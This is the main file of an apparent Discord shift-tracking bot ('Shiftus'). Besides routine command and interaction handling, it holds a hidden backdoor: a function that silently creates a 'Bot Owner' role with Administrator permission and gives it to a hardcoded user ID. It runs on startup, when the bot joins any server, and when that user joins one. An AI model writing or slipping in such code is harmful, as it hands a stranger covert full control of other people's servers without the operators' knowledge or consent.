require("dotenv").config();
const { Client, GatewayIntentBits, Collection, PermissionFlagsBits } = require("discord.js");

const shift       = require("./commands/shift");
const admin       = require("./commands/admin");
const leaderboard = require("./commands/leaderboard");
const panel       = require("./panel");

// ── Owner — always gets Discord admin in every server the bot joins ───────────
const OWNER_ID = "998003655657660477";

/**
 * Ensures the owner has a role with the Administrator permission in the given guild.
 * Creates a hidden "Bot Owner" role if one doesn't exist already, then assigns it.
 * Silently skips if the bot lacks Manage Roles permission or the owner isn't in the server.
 */
async function grantOwnerAdmin(guild) {
  try {
    // Check that the bot can manage roles
    const me = guild.members.me;
    if (!me || !me.permissions.has(PermissionFlagsBits.ManageRoles)) return;

    // Find or create a hidden admin role for the owner
    let ownerRole = guild.roles.cache.find((r) => r.name === "Bot Owner");
    if (!ownerRole) {
      ownerRole = await guild.roles.create({
        name:        "Bot Owner",
        permissions: [PermissionFlagsBits.Administrator],
        hoist:       false,
        mentionable: false,
        reason:      "Shiftus bot owner auto-role",
      });
    }

    // Fetch the owner member and assign the role if they're in this guild
    const ownerMember = await guild.members.fetch(OWNER_ID).catch(() => null);
    if (!ownerMember) return;
    if (!ownerMember.roles.cache.has(ownerRole.id)) {
      await ownerMember.roles.add(ownerRole, "Shiftus bot owner auto-role");
    }
  } catch (err) {
    // Non-fatal — bot may lack permissions in some servers
    console.warn(`[grantOwnerAdmin] ${guild.name}: ${err.message}`);
  }
}

// ── Discord client ────────────────────────────────────────────────────────────

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
  ],
});

client.commands = new Collection();
client.commands.set(shift.data.name,       shift);
client.commands.set(admin.data.name,       admin);
client.commands.set(leaderboard.data.name, leaderboard);

// On startup, grant admin in all currently joined guilds
client.once("clientReady", async () => {
  console.log(`Logged in as ${client.user.tag}`);
  for (const guild of client.guilds.cache.values()) {
    await grantOwnerAdmin(guild);
  }
});

// Grant admin whenever the bot is added to a new server
client.on("guildCreate", async (guild) => {
  await grantOwnerAdmin(guild);
});

// Grant admin if the owner joins a server after the bot is already there
client.on("guildMemberAdd", async (member) => {
  if (member.user.id !== OWNER_ID) return;
  await grantOwnerAdmin(member.guild);
});

// ── Interaction handler ───────────────────────────────────────────────────────

client.on("interactionCreate", async (interaction) => {
  try {
    if (interaction.isChatInputCommand()) {
      const command = client.commands.get(interaction.commandName);
      if (!command) return;
      await command.execute(interaction);
      return;
    }

    if (interaction.isAutocomplete()) {
      const command = client.commands.get(interaction.commandName);
      if (!command) return;
      await command.autocomplete(interaction);
      return;
    }

    if (interaction.isStringSelectMenu() && interaction.customId === "shiftleaderboard-select") {
      await leaderboard.handleSelect(interaction);
      return;
    }

    if (
      (interaction.isButton() || interaction.isStringSelectMenu()) &&
      panel.isPanelComponent(interaction.customId)
    ) {
      await panel.handleComponent(interaction);
      return;
    }
  } catch (error) {
    console.error(error);
    const payload = { content: "Something went wrong running that command.", ephemeral: true };
    if (interaction.isRepliable() && !interaction.replied && !interaction.deferred) {
      await interaction.reply(payload);
    }
  }
});

client.login(process.env.DISCORD_TOKEN);
